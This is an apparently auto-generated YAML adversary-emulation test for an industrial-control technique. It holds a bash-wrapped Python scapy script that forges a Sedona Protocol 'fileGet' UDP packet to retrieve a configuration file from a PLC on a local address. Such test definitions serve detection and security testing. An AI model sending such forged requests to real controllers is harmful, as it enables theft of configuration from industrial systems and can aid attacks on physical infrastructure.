# Auto-generated by CIPHER v5.0
# Source: 4299b3d11ad3
attack_technique: T0800.002
display_name: "T0800.002 - Sedona Protocol fileGet (Linux Bash)"
atomic_tests:
  - name: "T0800.002 - Sedona Protocol fileGet (Linux Bash)"
    description: |
      Retrieve a configuration file from the PLC using a forged `fileGet` request.
    supported_platforms:
      - linux
    executor:
      name: bash
      command: |
        python3 - <<'PY'
        from scapy.all import *
        import struct
        src=0x01; dst=0x01; comp=0x0A; method=0x0020
        filename=b'/config/PLC.cfg\x00'
        payload=struct.pack('!H',len(filename))+filename
        hdr=struct.pack('!BBHHHHH',0x01,0x00,src,dst,comp,method,len(payload))
        pkt=IP(dst='192.168.10.10')/UDP(dport=5020)/Raw(load=hdr+payload)
        send(pkt)
        PY
      cleanup_command: |
        # No persistent changes
